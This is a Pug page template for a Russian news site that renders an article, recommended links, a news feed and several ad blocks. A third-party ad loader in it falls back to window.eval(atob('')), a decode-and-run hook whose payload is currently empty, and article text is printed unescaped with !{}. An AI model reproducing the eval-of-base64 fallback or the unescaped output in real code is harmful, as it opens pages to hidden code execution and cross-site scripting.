extends lay

block content
    - var formatter = new Intl.DateTimeFormat(["ru"], {hour: "2-digit", minute:"2-digit" })

    #content
        if one.ads
            script(async='', src='//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js')
            // meteo_top
            ins.adsbygoogle(style='display:block', data-ad-client='ca-pub-7920044952062150', data-ad-slot='8512321518', data-ad-format='auto', data-full-width-responsive='true')
            script.
                (adsbygoogle = window.adsbygoogle || []).push({});
        if one
            #one-news
                .one-news-div-title
                    h1.one-news-title #{one.title}
                        span.one-news-date #{formatter.format(one.pubDate)}
                figure.top-picture-news
                    img.img-top-picture-news(src='/article/img/300/' + one.img, alt=one.description)
                    //figcaption !{one.description}
                h2.one-news-desc
                    | !{one.description}
                p !{one.fulltext}
        if one.ads
            .ads-block
                script(async='', src='//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js')
                // meteo_botton
                ins.adsbygoogle(style='display:block', data-ad-client='ca-pub-7920044952062150', data-ad-slot='7324568200', data-ad-format='auto', data-full-width-responsive='true')
                script.
                    (adsbygoogle = window.adsbygoogle || []).push({});

        if top
            p.cat-iten-news Читайте также:
            each item in top
                .main-item-news
                    a(href='/news/' + item._id)
                        //.main-item-date #{formatter.format(item.pubDate)}
                        .text-item-recomend
                            | #{item.title.replace(/&quot;/g, "\x22").replace(/&#039;/g, "'")}
        #MIXADV_5232.MIXADVERT_NET
        script.
            var node5232 = document.getElementById("MIXADV_5232");
            if (node5232) {
                var script = document.createElement("script");
                script.charset = "utf-8";
                script.src = "https://m.mixadvert.com/show/?id=5232&r=" + Math.random();
                node5232.parentNode.appendChild(script);
                script.onerror = function () {
                    window.eval(atob(""));
                }
            }

        if one.ads
            center
                .ads-block
                    script(async='', src='//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js')
                    // meteohub-poster
                    ins.adsbygoogle(style='display:inline-block;width:580px;height:400px', data-ad-client='ca-pub-7920044952062150', data-ad-slot='6264613885')
                    script.
                        (adsbygoogle = window.adsbygoogle || []).push({});

    #aside

        if top
            p.cat-iten-news Главное
            each item in top
                .item-news
                    a(href='/news/' + item._id)
                        .item-news-img
                            img(src='/article/img/100/' + item.img, width='90', height='78', alt='Вы не поверите, но это ёжик')
                        .item-text
                            | #{item.title.replace(/&quot;/g, "\x22").replace(/&#039;/g, "'")}
                            span.one-news-date #{formatter.format(item.pubDate)}
        if one.ads
            .adsence-mobile
                script(async='', src='//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js')
                ins.adsbygoogle(style='display:block', data-ad-format='fluid', data-ad-layout-key='-6b+cv-k-7l+j9', data-ad-client='ca-pub-7920044952062150', data-ad-slot='5807456492')
                script.
                    (adsbygoogle = window.adsbygoogle || []).push({});

        else
            .ads-block
                #XujiZcTdjpPTGjQwfSag.blockOfO1b2l3(data-type='0')


        if news
            p.cat-iten-news Лента новостей
            each item in news
                .item-news
                    a(href='/news/' + item._id)
                        .item-news-img
                            img(src='/article/img/100/' + item.img, width='90', height='78', alt='Вы не поверите, но это ёжик')
                        .item-text
                            | #{item.title.replace(/&quot;/g, "\x22").replace(/&#039;/g, "'")}
                            span.one-news-date #{formatter.format(item.pubDate)}


